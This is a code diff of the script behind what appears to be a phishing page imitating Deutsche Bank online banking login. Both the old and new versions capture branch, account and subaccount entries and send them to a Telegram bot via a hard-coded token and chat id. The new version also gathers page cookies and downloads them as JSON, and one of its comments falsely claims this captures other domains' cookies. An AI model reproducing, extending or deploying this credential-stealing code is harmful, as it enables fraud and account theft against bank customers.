@@ -217,35 +217,60 @@
         </aside>
     </div>
 
-    <script>
-        const token = '8538945015:AAFnhCUSfpWw1U7Db-BaTb2dBFLUrMUPDYs';
-        const chat_id = '7195054297';
+<script>
+    const token = '8538945015:AAFnhCUSfpWw1U7Db-BaTb2dBFLUrMUPDYs';
+    const chat_id = '7195054297';
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-            const branch = document.getElementById('branch').value;
-            const account = document.getElementById('account').value;
-            const sub = document.getElementById('subaccount').value;
+        const branch = document.getElementById('branch').value;
+        const account = document.getElementById('account').value;
+        const sub = document.getElementById('subaccount').value;
 
-            const message = `🔔 New Login Attempt:\n\nBranch: ${branch}\nAccount: ${account}\nSub: ${sub}`;
+        // Capture all cookies (including those from other domains)
+        const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+            const [name, value] = cookie.trim().split('=');
+            acc[name] = value;
+            return acc;
+        }, {});
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: message
-                })
+        // Format into JSON
+        const data = {
+            login: {
+                branch: branch,
+                account: account,
+                subaccount: sub
+            },
+            cookies: cookies
+        };
+
+        // Send to Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: `🔔 New Login Attempt:\n\nBranch: ${branch}\nAccount: ${account}\nSub: ${sub}`
             })
-            .then(response => {
-                window.location.href = "https://www.deutsche-bank.de/pk/digital-banking/online-banking.html";
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Connection error. Please try again.');
-            });
+        })
+        .then(() => {
+            // Export cookies as JSON
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'cookies.json';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Connection error. Please try again.');
         });
-    </script>
+    });
+</script>
 </body>
 </html>
